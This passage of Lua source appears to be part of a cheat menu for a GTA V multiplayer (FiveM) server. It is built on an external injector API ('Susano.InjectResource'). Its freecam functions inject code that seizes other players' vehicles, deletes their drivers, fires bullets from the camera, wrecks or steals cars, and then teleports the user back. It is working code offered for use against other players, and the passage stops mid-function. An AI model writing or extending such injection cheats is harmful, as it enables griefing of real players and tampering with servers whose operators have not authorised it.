    NewLoadSceneStart(cam_pos.x, cam_pos.y, cam_pos.z, cam_pos.x, cam_pos.y, cam_pos.z, 150.0, 0)
end

function DrawFreecamMenu()
    if not freecam_active then 
        Susano.BeginFrame()
        Susano.SubmitFrame()
        return 
    end
    
    Susano.BeginFrame()
    
    local screen_width, screen_height = GetActiveScreenResolution()
    
    
    local options = FreecamOptions
    local selectedIndex = FreecamSelectedOption or 1
    
    local maxVisibleOptions = 4
    
    if selectedIndex <= FreecamScrollOffset then
        FreecamScrollOffset = math.max(0, selectedIndex - 1)
    elseif selectedIndex > FreecamScrollOffset + maxVisibleOptions then
        FreecamScrollOffset = selectedIndex - maxVisibleOptions
    end
    
    local visibleOptions = {}
    local visibleIndices = {}
    local startIndex = FreecamScrollOffset + 1
    local endIndex = math.min(startIndex + maxVisibleOptions - 1, #options)
    
    for i = startIndex, endIndex do
        table.insert(visibleOptions, options[i])
        table.insert(visibleIndices, i)
    end
    
    local selectedR, selectedG, selectedB = 148.0 / 255.0, 0.0 / 255.0, 211.0 / 255.0
    local normalR, normalG, normalB = 200.0 / 255.0, 200.0 / 255.0, 200.0 / 255.0
    
    local selectedSize = 24.0
    local normalSize = 18.0
    
    local spacing = 35.0
    
    local totalHeight = (#visibleOptions - 1) * spacing + selectedSize
    local startY = screen_height - 150.0
    
    local maxTextWidth = 0
    for i = 1, #visibleOptions do
        local textWidth = string.len(visibleOptions[i]) * 10
        if textWidth > maxTextWidth then
            maxTextWidth = textWidth
        end
    end
    
    local centerX = screen_width / 2
    
    local indicatorText = string.format("%d / %d", selectedIndex, #options)
    local indicatorSize = 14.0
    local indicatorY = startY - 25.0
    local indicatorX = centerX
    
    local indicatorOutlineOffset = 1.0
    local indicatorOutlineAlpha = 0.5
    Susano.DrawText(indicatorX - indicatorOutlineOffset, indicatorY - indicatorOutlineOffset, indicatorText, indicatorSize, 0.0, 0.0, 0.0, indicatorOutlineAlpha)
    Susano.DrawText(indicatorX, indicatorY - indicatorOutlineOffset, indicatorText, indicatorSize, 0.0, 0.0, 0.0, indicatorOutlineAlpha)
    Susano.DrawText(indicatorX + indicatorOutlineOffset, indicatorY - indicatorOutlineOffset, indicatorText, indicatorSize, 0.0, 0.0, 0.0, indicatorOutlineAlpha)
    Susano.DrawText(indicatorX - indicatorOutlineOffset, indicatorY, indicatorText, indicatorSize, 0.0, 0.0, 0.0, indicatorOutlineAlpha)
    Susano.DrawText(indicatorX + indicatorOutlineOffset, indicatorY, indicatorText, indicatorSize, 0.0, 0.0, 0.0, indicatorOutlineAlpha)
    Susano.DrawText(indicatorX - indicatorOutlineOffset, indicatorY + indicatorOutlineOffset, indicatorText, indicatorSize, 0.0, 0.0, 0.0, indicatorOutlineAlpha)
    Susano.DrawText(indicatorX, indicatorY + indicatorOutlineOffset, indicatorText, indicatorSize, 0.0, 0.0, 0.0, indicatorOutlineAlpha)
    Susano.DrawText(indicatorX + indicatorOutlineOffset, indicatorY + indicatorOutlineOffset, indicatorText, indicatorSize, 0.0, 0.0, 0.0, indicatorOutlineAlpha)
    
    Susano.DrawText(indicatorX, indicatorY, indicatorText, indicatorSize, normalR, normalG, normalB, 1.0)
    
    for i = 1, #visibleOptions do
        local actualIndex = visibleIndices[i]
        local isSelected = (actualIndex == selectedIndex)
        local textSize = isSelected and selectedSize or normalSize
        local r, g, b = normalR, normalG, normalB
        
        if isSelected then
            r, g, b = selectedR, selectedG, selectedB
        end
        
        local yPos = startY + (i - 1) * spacing
        local xPos = centerX - (maxTextWidth / 2)
        
        local outlineOffset = 1.0
        local outlineAlpha = 0.5
        Susano.DrawText(xPos - outlineOffset, yPos - outlineOffset, visibleOptions[i], textSize, 0.0, 0.0, 0.0, outlineAlpha)
        Susano.DrawText(xPos, yPos - outlineOffset, visibleOptions[i], textSize, 0.0, 0.0, 0.0, outlineAlpha)
        Susano.DrawText(xPos + outlineOffset, yPos - outlineOffset, visibleOptions[i], textSize, 0.0, 0.0, 0.0, outlineAlpha)
        Susano.DrawText(xPos - outlineOffset, yPos, visibleOptions[i], textSize, 0.0, 0.0, 0.0, outlineAlpha)
        Susano.DrawText(xPos + outlineOffset, yPos, visibleOptions[i], textSize, 0.0, 0.0, 0.0, outlineAlpha)
        Susano.DrawText(xPos - outlineOffset, yPos + outlineOffset, visibleOptions[i], textSize, 0.0, 0.0, 0.0, outlineAlpha)
        Susano.DrawText(xPos, yPos + outlineOffset, visibleOptions[i], textSize, 0.0, 0.0, 0.0, outlineAlpha)
        Susano.DrawText(xPos + outlineOffset, yPos + outlineOffset, visibleOptions[i], textSize, 0.0, 0.0, 0.0, outlineAlpha)
        
        Susano.DrawText(xPos, yPos, visibleOptions[i], textSize, r, g, b, 1.0)
    end
    
    Susano.SubmitFrame()
end

function WarpVehicleToFreecam()
    if type(Susano) ~= "table" or type(Susano.InjectResource) ~= "function" then
        return
    end
    
    local ped = PlayerPedId()
    local currentCamCoords = cam_pos
    local currentCamRot = cam_rot
    
    local pitch = math.rad(currentCamRot.x)
    local yaw = math.rad(currentCamRot.z)
    
    local dirX = -math.sin(yaw) * math.cos(pitch)
    local dirY = math.cos(yaw) * math.cos(pitch)
    local dirZ = math.sin(pitch)
    
    local direction = vector3(dirX, dirY, dirZ)
    
    Susano.InjectResource("any", string.format([[
        local ped = PlayerPedId()
        local camCoords = vector3(%f, %f, %f)
        local direction = vector3(%f, %f, %f)
        
        local raycastStart = camCoords
        local raycastEnd = vector3(
            camCoords.x + direction.x * 1000.0,
            camCoords.y + direction.y * 1000.0,
            camCoords.z + direction.z * 1000.0
        )
        
        local raycast = StartExpensiveSynchronousShapeTestLosProbe(
            raycastStart.x, raycastStart.y, raycastStart.z,
            raycastEnd.x, raycastEnd.y, raycastEnd.z,
            -1, ped, 7
        )
        
        local _, hit, endCoords, surfaceNormal, entityHit = GetShapeTestResult(raycast)
        
        if hit and entityHit and DoesEntityExist(entityHit) and GetEntityType(entityHit) == 2 then
            local targetVehicle = entityHit
            
            local hasPlayerInside = false
            local numSeats = GetVehicleModelNumberOfSeats(GetEntityModel(targetVehicle))
            if numSeats and numSeats > 0 then
                for seat = -1, (numSeats - 2) do
                    local seatPed = GetPedInVehicleSeat(targetVehicle, seat)
                    if seatPed and seatPed ~= 0 and DoesEntityExist(seatPed) then
                        for _, player in ipairs(GetActivePlayers()) do
                            if GetPlayerPed(player) == seatPed then
                                hasPlayerInside = true
                                break
                            end
                        end
                        if hasPlayerInside then break end
                    end
                end
            end
            
            if hasPlayerInside then
                local playerPed = ped
                
                local function RequestControl(entity, timeoutMs)
                    if not entity or not DoesEntityExist(entity) then return false end
                    local start = GetGameTimer()
                    NetworkRequestControlOfEntity(entity)
                    while not NetworkHasControlOfEntity(entity) do
                        Wait(0)
                        if GetGameTimer() - start > (timeoutMs or 750) then
                            return false
                        end
                        NetworkRequestControlOfEntity(entity)
                    end
                    return true
                end
                
                local function tryEnterSeat(seatIndex)
                    SetPedIntoVehicle(playerPed, targetVehicle, seatIndex)
                    Wait(0)
                    return IsPedInVehicle(playerPed, targetVehicle, false) and GetPedInVehicleSeat(targetVehicle, seatIndex) == playerPed
                end
                
                local function getFirstFreeSeat(v)
                    local numSeats = GetVehicleModelNumberOfSeats(GetEntityModel(v))
                    if not numSeats or numSeats <= 0 then return -1 end
                    for seat = 0, (numSeats - 2) do
                        if IsVehicleSeatFree(v, seat) then return seat end
                    end
                    return -1
                end
                
                if RequestControl(targetVehicle, 750) then
                    ClearPedTasksImmediately(playerPed)
                    SetVehicleDoorsLocked(targetVehicle, 1)
                    SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)
                    
                    local success = false
                    if IsVehicleSeatFree(targetVehicle, -1) and tryEnterSeat(-1) then
                        success = true
                    end
                    
                    if not success and GetPedInVehicleSeat(targetVehicle, -1) == playerPed then
                        success = true
                    end
                    
                    if not success then
                        local fallbackSeat = getFirstFreeSeat(targetVehicle)
                        if fallbackSeat ~= -1 and tryEnterSeat(fallbackSeat) then
                            local drv = GetPedInVehicleSeat(targetVehicle, -1)
                            if drv ~= 0 and drv ~= playerPed and DoesEntityExist(drv) then
                                RequestControl(drv, 750)
                                ClearPedTasksImmediately(drv)
                                SetEntityAsMissionEntity(drv, true, true)
                                SetEntityCoords(drv, 0.0, 0.0, -100.0, false, false, false, false)
                                Wait(50)
                                DeleteEntity(drv)
                                
                                for i=1,80 do
                                    local occ = GetPedInVehicleSeat(targetVehicle, -1)
                                    if occ == 0 or (occ ~= 0 and not DoesEntityExist(occ)) then break end
                                    Wait(0)
                                end
                            end
                            
                            for attempt = 1, 30 do
                                if IsVehicleSeatFree(targetVehicle, -1) and tryEnterSeat(-1) then
                                    break
                                end
                                Wait(0)
                            end
                        end
                    end
                end
            end
        end
    ]], currentCamCoords.x, currentCamCoords.y, currentCamCoords.z, direction.x, direction.y, direction.z))
end

function ShootBulletFromFreecam()
    if type(Susano) ~= "table" or type(Susano.InjectResource) ~= "function" then
        return
    end
    
    local ped = PlayerPedId()
    local currentCamCoords = cam_pos
    local currentCamRot = cam_rot
    
    local pitch = math.rad(currentCamRot.x)
    local yaw = math.rad(currentCamRot.z)
    
    local dirX = -math.sin(yaw) * math.cos(pitch)
    local dirY = math.cos(yaw) * math.cos(pitch)
    local dirZ = math.sin(pitch)
    
    local direction = vector3(dirX, dirY, dirZ)
    
    Susano.InjectResource("any", string.format([[
        local ped = PlayerPedId()
        local camCoords = vector3(%f, %f, %f)
        local direction = vector3(%f, %f, %f)
        
        local currentWeapon = GetSelectedPedWeapon(ped)
        local hasValidWeapon = false
        
        if currentWeapon ~= GetHashKey("WEAPON_UNARMED") and currentWeapon ~= 0 then
            if HasPedGotWeapon(ped, currentWeapon, false) then
                hasValidWeapon = true
            else
                currentWeapon = GetHashKey("WEAPON_UNARMED")
            end
        end
        
        if not hasValidWeapon then
            local weapons = {
                "WEAPON_PISTOL", "WEAPON_PISTOL_MK2", "WEAPON_COMBATPISTOL", "WEAPON_APPISTOL",
                "WEAPON_PISTOL50", "WEAPON_SNSPISTOL", "WEAPON_HEAVYPISTOL", "WEAPON_VINTAGEPISTOL",
                "WEAPON_MICROSMG", "WEAPON_SMG", "WEAPON_SMG_MK2", "WEAPON_ASSAULTSMG",
                "WEAPON_ASSAULTRIFLE", "WEAPON_ASSAULTRIFLE_MK2", "WEAPON_CARBINERIFLE", "WEAPON_CARBINERIFLE_MK2",
                "WEAPON_ADVANCEDRIFLE", "WEAPON_SPECIALCARBINE", "WEAPON_BULLPUPRIFLE", "WEAPON_COMPACTRIFLE",
                "WEAPON_SNIPERRIFLE", "WEAPON_HEAVYSNIPER", "WEAPON_HEAVYSNIPER_MK2", "WEAPON_MARKSMANRIFLE",
                "WEAPON_PUMPSHOTGUN", "WEAPON_PUMPSHOTGUN_MK2", "WEAPON_SAWNOFFSHOTGUN", "WEAPON_ASSAULTSHOTGUN",
                "WEAPON_MG", "WEAPON_COMBATMG", "WEAPON_COMBATMG_MK2", "WEAPON_GUSENBERG",
                "WEAPON_RPG", "WEAPON_GRENADELAUNCHER", "WEAPON_MINIGUN", "WEAPON_RAILGUN"
            }
            for _, weaponName in ipairs(weapons) do
                local weaponHash = GetHashKey(weaponName)
                if HasPedGotWeapon(ped, weaponHash, false) then
                    currentWeapon = weaponHash
                    hasValidWeapon = true
                    break
                end
            end
        end
        
        if hasValidWeapon and currentWeapon ~= GetHashKey("WEAPON_UNARMED") and currentWeapon ~= 0 then
            local startCoords = vector3(
                camCoords.x + direction.x * 0.1,
                camCoords.y + direction.y * 0.1,
                camCoords.z + direction.z * 0.1
            )
            
            local distance = 1000.0
            local endX = camCoords.x + direction.x * distance
            local endY = camCoords.y + direction.y * distance
            local endZ = camCoords.z + direction.z * distance
            local targetCoords = vector3(endX, endY, endZ)
            
            local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, endX, endY, endZ, -1, ped, 0)
            local retval, hit, hitCoords = GetShapeTestResult(rayHandle)
            
            if hit and hitCoords then
                targetCoords = hitCoords
            end
            
            ShootSingleBulletBetweenCoords(
                startCoords.x, startCoords.y, startCoords.z,
                targetCoords.x, targetCoords.y, targetCoords.z,
                40, true, currentWeapon, ped, true, false, 1000.0
            )
        end
    ]], currentCamCoords.x, currentCamCoords.y, currentCamCoords.z, direction.x, direction.y, direction.z))
end

function UnusableVehicleFromFreecam()
    if type(Susano) ~= "table" or type(Susano.InjectResource) ~= "function" then
        return
    end
    
    local ped = PlayerPedId()
    local playerCoords = GetEntityCoords(ped)
    local playerHeading = GetEntityHeading(ped)
    local currentCamCoords = cam_pos
    local currentCamRot = cam_rot
    
    local pitch = math.rad(currentCamRot.x)
    local yaw = math.rad(currentCamRot.z)
    
    local dirX = -math.sin(yaw) * math.cos(pitch)
    local dirY = math.cos(yaw) * math.cos(pitch)
    local dirZ = math.sin(pitch)
    
    local direction = vector3(dirX, dirY, dirZ)
    
    Susano.InjectResource("any", string.format([[
        local ped = PlayerPedId()
        local playerCoords = vector3(%f, %f, %f)
        local playerHeading = %f
        local camCoords = vector3(%f, %f, %f)
        local direction = vector3(%f, %f, %f)
        
        local raycastStart = camCoords
        local raycastEnd = vector3(
            camCoords.x + direction.x * 1000.0,
            camCoords.y + direction.y * 1000.0,
            camCoords.z + direction.z * 1000.0
        )
        
        local raycast = StartExpensiveSynchronousShapeTestLosProbe(
            raycastStart.x, raycastStart.y, raycastStart.z,
            raycastEnd.x, raycastEnd.y, raycastEnd.z,
            -1, ped, 7
        )
        
        local _, hit, endCoords, surfaceNormal, entityHit = GetShapeTestResult(raycast)
        
        if hit and entityHit and DoesEntityExist(entityHit) and GetEntityType(entityHit) == 2 then
            local targetVehicle = entityHit
            local playerPed = ped
            
            local hasPlayerInside = false
            local numSeats = GetVehicleModelNumberOfSeats(GetEntityModel(targetVehicle))
            if numSeats and numSeats > 0 then
                for seat = -1, (numSeats - 2) do
                    local seatPed = GetPedInVehicleSeat(targetVehicle, seat)
                    if seatPed and seatPed ~= 0 and DoesEntityExist(seatPed) then
                        for _, player in ipairs(GetActivePlayers()) do
                            if GetPlayerPed(player) == seatPed then
                                hasPlayerInside = true
                                break
                            end
                        end
                        if hasPlayerInside then break end
                    end
                end
            end
            
            if hasPlayerInside then
                local function RequestControl(entity, timeoutMs)
                    if not entity or not DoesEntityExist(entity) then return false end
                    local start = GetGameTimer()
                    NetworkRequestControlOfEntity(entity)
                    while not NetworkHasControlOfEntity(entity) do
                        Wait(0)
                        if GetGameTimer() - start > (timeoutMs or 750) then
                            return false
                        end
                        NetworkRequestControlOfEntity(entity)
                    end
                    return true
                end
                
                local function tryEnterSeat(seatIndex)
                    SetPedIntoVehicle(playerPed, targetVehicle, seatIndex)
                    Wait(0)
                    return IsPedInVehicle(playerPed, targetVehicle, false) and GetPedInVehicleSeat(targetVehicle, seatIndex) == playerPed
                end
                
                local function getFirstFreeSeat(v)
                    local numSeats = GetVehicleModelNumberOfSeats(GetEntityModel(v))
                    if not numSeats or numSeats <= 0 then return -1 end
                    for seat = 0, (numSeats - 2) do
                        if IsVehicleSeatFree(v, seat) then return seat end
                    end
                    return -1
                end
                
                if RequestControl(targetVehicle, 750) then
                    ClearPedTasksImmediately(playerPed)
                    SetVehicleDoorsLocked(targetVehicle, 1)
                    SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)
                    
                    local success = false
                    if IsVehicleSeatFree(targetVehicle, -1) and tryEnterSeat(-1) then
                        success = true
                    end
                    
                    if not success and GetPedInVehicleSeat(targetVehicle, -1) == playerPed then
                        success = true
                    end
                    
                    if not success then
                        local fallbackSeat = getFirstFreeSeat(targetVehicle)
                        if fallbackSeat ~= -1 and tryEnterSeat(fallbackSeat) then
                            local drv = GetPedInVehicleSeat(targetVehicle, -1)
                            if drv ~= 0 and drv ~= playerPed and DoesEntityExist(drv) then
                                RequestControl(drv, 750)
                                ClearPedTasksImmediately(drv)
                                SetEntityAsMissionEntity(drv, true, true)
                                SetEntityCoords(drv, 0.0, 0.0, -100.0, false, false, false, false)
                                Wait(50)
                                DeleteEntity(drv)
                                
                                for i=1,80 do
                                    local occ = GetPedInVehicleSeat(targetVehicle, -1)
                                    if occ == 0 or (occ ~= 0 and not DoesEntityExist(occ)) then break end
                                    Wait(0)
                                end
                            end
                            
                            for attempt = 1, 30 do
                                if IsVehicleSeatFree(targetVehicle, -1) and tryEnterSeat(-1) then
                                    break
                                end
                                Wait(0)
                            end
                        end
                    end
                    
                    Wait(200)
                    
                    SetEntityCoordsNoOffset(playerPed, playerCoords.x, playerCoords.y, playerCoords.z, false, false, false)
                    SetEntityHeading(playerPed, playerHeading)
                    
                end
            end
        else
            SetEntityCoordsNoOffset(ped, playerCoords.x, playerCoords.y, playerCoords.z, false, false, false)
            SetEntityHeading(ped, playerHeading)
        end
    ]], playerCoords.x, playerCoords.y, playerCoords.z, playerHeading, currentCamCoords.x, currentCamCoords.y, currentCamCoords.z, direction.x, direction.y, direction.z))
end

function FuckVehicleFromFreecam()
    if type(Susano) ~= "table" or type(Susano.InjectResource) ~= "function" then
        return
    end
    
    local ped = PlayerPedId()
    local playerCoords = GetEntityCoords(ped)
    local playerHeading = GetEntityHeading(ped)
    local currentCamCoords = cam_pos
    local currentCamRot = cam_rot
    
    local pitch = math.rad(currentCamRot.x)
    local yaw = math.rad(currentCamRot.z)
    
    local dirX = -math.sin(yaw) * math.cos(pitch)
    local dirY = math.cos(yaw) * math.cos(pitch)
    local dirZ = math.sin(pitch)
    
    local direction = vector3(dirX, dirY, dirZ)
    
    Susano.InjectResource("any", string.format([[
        local ped = PlayerPedId()
        local playerCoords = vector3(%f, %f, %f)
        local playerHeading = %f
        local camCoords = vector3(%f, %f, %f)
        local direction = vector3(%f, %f, %f)
        
        local raycastStart = camCoords
        local raycastEnd = vector3(
            camCoords.x + direction.x * 1000.0,
            camCoords.y + direction.y * 1000.0,
            camCoords.z + direction.z * 1000.0
        )
        
        local raycast = StartExpensiveSynchronousShapeTestLosProbe(
            raycastStart.x, raycastStart.y, raycastStart.z,
            raycastEnd.x, raycastEnd.y, raycastEnd.z,
            -1, ped, 7
        )
        
        local _, hit, endCoords, surfaceNormal, entityHit = GetShapeTestResult(raycast)
        
        if hit and entityHit and DoesEntityExist(entityHit) and GetEntityType(entityHit) == 2 then
            local targetVehicle = entityHit
            local playerPed = ped
            
            local hasPlayerInside = false
            local numSeats = GetVehicleModelNumberOfSeats(GetEntityModel(targetVehicle))
            if numSeats and numSeats > 0 then
                for seat = -1, (numSeats - 2) do
                    local seatPed = GetPedInVehicleSeat(targetVehicle, seat)
                    if seatPed and seatPed ~= 0 and DoesEntityExist(seatPed) then
                        for _, player in ipairs(GetActivePlayers()) do
                            if GetPlayerPed(player) == seatPed then
                                hasPlayerInside = true
                                break
                            end
                        end
                        if hasPlayerInside then break end
                    end
                end
            end
            
            local function RequestControl(entity, timeoutMs)
                if not entity or not DoesEntityExist(entity) then return false end
                local start = GetGameTimer()
                NetworkRequestControlOfEntity(entity)
                while not NetworkHasControlOfEntity(entity) do
                    Wait(0)
                    if GetGameTimer() - start > (timeoutMs or 750) then
                        return false
                    end
                    NetworkRequestControlOfEntity(entity)
                end
                return true
            end
            
            local function tryEnterSeat(seatIndex)
                SetPedIntoVehicle(playerPed, targetVehicle, seatIndex)
                Wait(0)
                return IsPedInVehicle(playerPed, targetVehicle, false) and GetPedInVehicleSeat(targetVehicle, seatIndex) == playerPed
            end
            
            local function getFirstFreeSeat(v)
                local numSeats = GetVehicleModelNumberOfSeats(GetEntityModel(v))
                if not numSeats or numSeats <= 0 then return -1 end
                for seat = 0, (numSeats - 2) do
                    if IsVehicleSeatFree(v, seat) then return seat end
                end
                return -1
            end
            
            if RequestControl(targetVehicle, 750) then
                ClearPedTasksImmediately(playerPed)
                SetVehicleDoorsLocked(targetVehicle, 1)
                SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)
                
                local success = false
                if IsVehicleSeatFree(targetVehicle, -1) and tryEnterSeat(-1) then
                    success = true
                end
                
                if not success and GetPedInVehicleSeat(targetVehicle, -1) == playerPed then
                    success = true
                end
                
                if not success then
                    local fallbackSeat = getFirstFreeSeat(targetVehicle)
                    if fallbackSeat ~= -1 and tryEnterSeat(fallbackSeat) then
                        local drv = GetPedInVehicleSeat(targetVehicle, -1)
                        if drv ~= 0 and drv ~= playerPed and DoesEntityExist(drv) then
                            RequestControl(drv, 750)
                            ClearPedTasksImmediately(drv)
                            SetEntityAsMissionEntity(drv, true, true)
                            SetEntityCoords(drv, 0.0, 0.0, -100.0, false, false, false, false)
                            Wait(50)
                            DeleteEntity(drv)
                            
                            for i=1,80 do
                                local occ = GetPedInVehicleSeat(targetVehicle, -1)
                                if occ == 0 or (occ ~= 0 and not DoesEntityExist(occ)) then break end
                                Wait(0)
                            end
                        end
                        
                        for attempt = 1, 30 do
                            if IsVehicleSeatFree(targetVehicle, -1) and tryEnterSeat(-1) then
                                break
                            end
                            Wait(0)
                        end
                    end
                end
                
                Wait(200)
                
                SetVehicleEngineHealth(targetVehicle, -4000.0)
                SetVehicleBodyHealth(targetVehicle, -4000.0)
                SetVehiclePetrolTankHealth(targetVehicle, -4000.0)
                
                for door = 0, 5 do
                    SetVehicleDoorBroken(targetVehicle, door, true)
                    RemoveVehicleDoor(targetVehicle, door, false)
                end
                
                for wheel = 0, 3 do
                    SetVehicleTyreBurst(targetVehicle, wheel, true, 1000.0)
                    SetVehicleWheelHealth(targetVehicle, wheel, -1000.0)
                    SetVehicleTyreBurst(targetVehicle, wheel, true, 1000.0)
                end
                SetVehicleWheelType(targetVehicle, 7)
                Wait(50)
                for wheel = 0, 3 do
                    SetVehicleTyreBurst(targetVehicle, wheel, true, 1000.0)
                    SetVehicleWheelHealth(targetVehicle, wheel, -1000.0)
                end
                
                for window = 0, 5 do
                    SmashVehicleWindow(targetVehicle, window)
                end
                
                SetVehicleDoorOpen(targetVehicle, 4, false, false)
                SetVehicleDoorOpen(targetVehicle, 5, false, false)
                SetVehicleDoorBroken(targetVehicle, 4, true)
                SetVehicleDoorBroken(targetVehicle, 5, true)
                RemoveVehicleDoor(targetVehicle, 4, false)
                RemoveVehicleDoor(targetVehicle, 5, false)
                
                Wait(100)
                
                if IsPedInAnyVehicle(playerPed, false) then
                    ClearPedTasksImmediately(playerPed)
                    TaskLeaveVehicle(playerPed, targetVehicle, 0)
                    Wait(100)
                end
            end
            
            if IsPedInAnyVehicle(playerPed, false) then
                ClearPedTasksImmediately(playerPed)
                TaskLeaveVehicle(playerPed, targetVehicle, 0)
                Wait(100)
            end
            SetEntityCoordsNoOffset(playerPed, playerCoords.x, playerCoords.y, playerCoords.z, false, false, false)
            SetEntityHeading(playerPed, playerHeading)
            Wait(50)
            SetEntityCoordsNoOffset(playerPed, playerCoords.x, playerCoords.y, playerCoords.z, false, false, false)
            SetEntityHeading(playerPed, playerHeading)
        else
            SetEntityCoordsNoOffset(ped, playerCoords.x, playerCoords.y, playerCoords.z, false, false, false)
            SetEntityHeading(ped, playerHeading)
        end
    ]], playerCoords.x, playerCoords.y, playerCoords.z, playerHeading, currentCamCoords.x, currentCamCoords.y, currentCamCoords.z, direction.x, direction.y, direction.z))
end

function StealVehicleFromFreecam()
    if type(Susano) ~= "table" or type(Susano.InjectResource) ~= "function" then
        return
    end
    
    local ped = PlayerPedId()
    local playerCoords = GetEntityCoords(ped)
    local playerHeading = GetEntityHeading(ped)
    local currentCamCoords = cam_pos
    local currentCamRot = cam_rot
    
    local pitch = math.rad(currentCamRot.x)
    local yaw = math.rad(currentCamRot.z)
    
    local dirX = -math.sin(yaw) * math.cos(pitch)
    local dirY = math.cos(yaw) * math.cos(pitch)
    local dirZ = math.sin(pitch)
    
    local direction = vector3(dirX, dirY, dirZ)
    
    Susano.InjectResource("any", string.format([[
        local ped = PlayerPedId()
        local playerCoords = vector3(%f, %f, %f)
        local playerHeading = %f
        local camCoords = vector3(%f, %f, %f)
        local direction = vector3(%f, %f, %f)
        
        local raycastStart = camCoords
        local raycastEnd = vector3(
            camCoords.x + direction.x * 1000.0,
            camCoords.y + direction.y * 1000.0,
            camCoords.z + direction.z * 1000.0
        )
        
        local raycast = StartExpensiveSynchronousShapeTestLosProbe(
            raycastStart.x, raycastStart.y, raycastStart.z,
            raycastEnd.x, raycastEnd.y, raycastEnd.z,
            -1, ped, 7
        )
        
        local _, hit, endCoords, surfaceNormal, entityHit = GetShapeTestResult(raycast)
        
        if hit and entityHit and DoesEntityExist(entityHit) and GetEntityType(entityHit) == 2 then
            local targetVehicle = entityHit
            local playerPed = ped
            
            local function RequestControl(entity, timeoutMs)
                if not entity or not DoesEntityExist(entity) then return false end
                local start = GetGameTimer()
                NetworkRequestControlOfEntity(entity)
                while not NetworkHasControlOfEntity(entity) do
                    Wait(0)
                    if GetGameTimer() - start > (timeoutMs or 500) then
                        return false
                    end
                    NetworkRequestControlOfEntity(entity)
                end
                return true
            end
            
            RequestControl(targetVehicle, 800)
            SetVehicleDoorsLocked(targetVehicle, 1)
            SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)
            
            local function tryEnterSeat(seatIndex)
                SetPedIntoVehicle(playerPed, targetVehicle, seatIndex)
                Wait(0)
                return IsPedInVehicle(playerPed, targetVehicle, false) and GetPedInVehicleSeat(targetVehicle, seatIndex) == playerPed
            end
            
            local function getFirstFreeSeat(v)
                local numSeats = GetVehicleModelNumberOfSeats(GetEntityModel(v))
                if not numSeats or numSeats <= 0 then return -1 end
                for seat = 0, (numSeats - 2) do
                    if IsVehicleSeatFree(v, seat) then return seat end
                end
                return -1
            end
            
            ClearPedTasksImmediately(playerPed)
            SetVehicleDoorsLocked(targetVehicle, 1)
            SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)
            
            local takeoverSuccess = false
            local tStart = GetGameTimer()
            
            while (GetGameTimer() - tStart) < 1000 do
                RequestControl(targetVehicle, 400)
                
                if IsVehicleSeatFree(targetVehicle, -1) and tryEnterSeat(-1) then
                    takeoverSuccess = true
                    break
                end
                
                if not IsPedInVehicle(playerPed, targetVehicle, false) then
                    local fs = getFirstFreeSeat(targetVehicle)
                    if fs ~= -1 then
                        tryEnterSeat(fs)
                    end
                end
                
                local drv = GetPedInVehicleSeat(targetVehicle, -1)
                if drv ~= 0 and drv ~= playerPed and DoesEntityExist(drv) then
                    RequestControl(drv, 400)
                    ClearPedTasksImmediately(drv)
                    SetEntityAsMissionEntity(drv, true, true)
                    SetEntityCoords(drv, 0.0, 0.0, -100.0, false, false, false, false)
                    Wait(20)
                    DeleteEntity(drv)
                end
                
                local t0 = GetGameTimer()
                while (GetGameTimer() - t0) < 400 do
                    local occ = GetPedInVehicleSeat(targetVehicle, -1)
                    if occ == 0 or (occ ~= 0 and not DoesEntityExist(occ)) then break end
                    Wait(0)
                end
                
                local t1 = GetGameTimer()
                while (GetGameTimer() - t1) < 500 do
                    if IsVehicleSeatFree(targetVehicle, -1) and tryEnterSeat(-1) then
                        takeoverSuccess = true
                        break
                    end
                    Wait(0)
                end
                if takeoverSuccess then break end
                Wait(0)
            end
            
            if takeoverSuccess then
                if DoesEntityExist(targetVehicle) and IsPedInVehicle(playerPed, targetVehicle, false) then
                    RequestControl(targetVehicle, 1000)
                    if NetworkHasControlOfEntity(targetVehicle) then
                        FreezeEntityPosition(targetVehicle, true)
                        SetVehicleEngineOn(targetVehicle, true, true, false)
                        SetEntityCoordsNoOffset(targetVehicle, playerCoords.x, playerCoords.y, playerCoords.z + 1.0, false, false, false, false)
                        SetEntityHeading(targetVehicle, playerHeading)
                        SetEntityVelocity(targetVehicle, 0.0, 0.0, 0.0)
                        Wait(100)
                        FreezeEntityPosition(targetVehicle, false)
                        SetVehicleOnGroundProperly(targetVehicle)
                    end
                end
            end
        end
    ]], playerCoords.x, playerCoords.y, playerCoords.z, playerHeading, currentCamCoords.x, currentCamCoords.y, currentCamCoords.z, direction.x, direction.y, direction.z))
end

function DeleteVehicleFromFreecam()
    if type(Susano) ~= "table" or type(Susano.InjectResource) ~= "function" then
        return
    end
    
    local ped = PlayerPedId()
    local playerCoords = GetEntityCoords(ped)
    local playerHeading = GetEntityHeading(ped)
    local currentCamCoords = cam_pos
    local currentCamRot = cam_rot
    
    local pitch = math.rad(currentCamRot.x)
    local yaw = math.rad(currentCamRot.z)
    
    local dirX = -math.sin(yaw) * math.cos(pitch)
    local dirY = math.cos(yaw) * math.cos(pitch)
    local dirZ = math.sin(pitch)
    
    local direction = vector3(dirX, dirY, dirZ)
    
    Susano.InjectResource("any", string.format([[
        local ped = PlayerPedId()
        local playerCoords = vector3(%f, %f, %f)
        local playerHeading = %f
        local camCoords = vector3(%f, %f, %f)
        local direction = vector3(%f, %f, %f)
        
        local raycastStart = camCoords
        local raycastEnd = vector3(
            camCoords.x + direction.x * 1000.0,
            camCoords.y + direction.y * 1000.0,
            camCoords.z + direction.z * 1000.0
        )
        
        local raycast = StartExpensiveSynchronousShapeTestLosProbe(
            raycastStart.x, raycastStart.y, raycastStart.z,
            raycastEnd.x, raycastEnd.y, raycastEnd.z,
            -1, ped, 7
        )
        
        local _, hit, endCoords, surfaceNormal, entityHit = GetShapeTestResult(raycast)
        
        if hit and entityHit and DoesEntityExist(entityHit) and GetEntityType(entityHit) == 2 then
            local targetVehicle = entityHit
            local playerPed = ped
            
            local function RequestControl(entity, timeoutMs)
                if not entity or not DoesEntityExist(entity) then return false end
                local start = GetGameTimer()
                NetworkRequestControlOfEntity(entity)
                while not NetworkHasControlOfEntity(entity) do
                    Wait(0)
                    if GetGameTimer() - start > (timeoutMs or 750) then
                        return false
                    end
                    NetworkRequestControlOfEntity(entity)
                end
                return true
            end
            
            local function tryEnterSeat(seatIndex)
